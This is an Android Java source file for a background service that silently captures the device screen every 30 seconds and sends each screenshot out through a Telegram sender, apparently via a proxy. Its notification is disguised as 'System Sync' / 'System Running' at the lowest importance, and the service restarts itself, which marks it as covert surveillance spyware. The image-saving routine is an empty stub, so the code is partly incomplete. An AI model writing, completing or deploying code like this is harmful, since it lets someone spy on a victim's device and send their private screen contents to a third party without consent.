package com.tom5.monitor;

import android.app.*;
import android.content.*;
import android.graphics.*;
import android.media.*;
import android.media.projection.*;
import android.os.*;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import java.io.*;
import java.nio.ByteBuffer;

public class ScreenService extends Service {
    private MediaProjection mMediaProjection;
    private ImageReader mImageReader;
    private Handler mHandler;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();
        
        int resultCode = intent.getIntExtra("resultCode", 0);
        Intent data = intent.getParcelableExtra("data");

        MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        mMediaProjection = mpm.getMediaProjection(resultCode, data);

        setupImageReader();
        startCaptureLoop();

        return START_STICKY;
    }

    private void setupImageReader() {
        DisplayMetrics metrics = new DisplayMetrics();
        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        wm.getDefaultDisplay().getRealMetrics(metrics);
        
        mImageReader = ImageReader.newInstance(metrics.widthPixels, metrics.heightPixels, PixelFormat.RGBA_8888, 2);
        mMediaProjection.createVirtualDisplay("ScreenCapture", metrics.widthPixels, metrics.heightPixels, 
                metrics.densityDpi, DisplayMetrics.DENSITY_DEFAULT, mImageReader.getSurface(), null, null);
    }

    private void startCaptureLoop() {
        mHandler = new Handler();
        mHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                captureAndSend();
                mHandler.postDelayed(this, 30000); // لقطة كل 30 ثانية
            }
        }, 5000);
    }

    private void captureAndSend() {
        Image image = mImageReader.acquireLatestImage();
        if (image != null) {
            // كود تحويل Image إلى File PNG (مختصر للجاهزية)
            File file = saveImageToFile(image); 
            TelegramSender.sendPhoto(file); // الإرسال عبر البروكسي
            image.close();
        }
    }

    private void createNotificationChannel() {
        NotificationChannel chan = new NotificationChannel("sys", "System Sync", NotificationManager.IMPORTANCE_NONE);
        NotificationManager service = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        service.createNotificationChannel(chan);
        Notification status = new Notification.Builder(this, "sys").setContentTitle("System Running").build();
        startForeground(1, status);
    }

    @Override public IBinder onBind(Intent intent) { return null; }
    private File saveImageToFile(Image img) { /* كود الحفظ */ return new File(getCacheDir(), "scr.png"); }
}
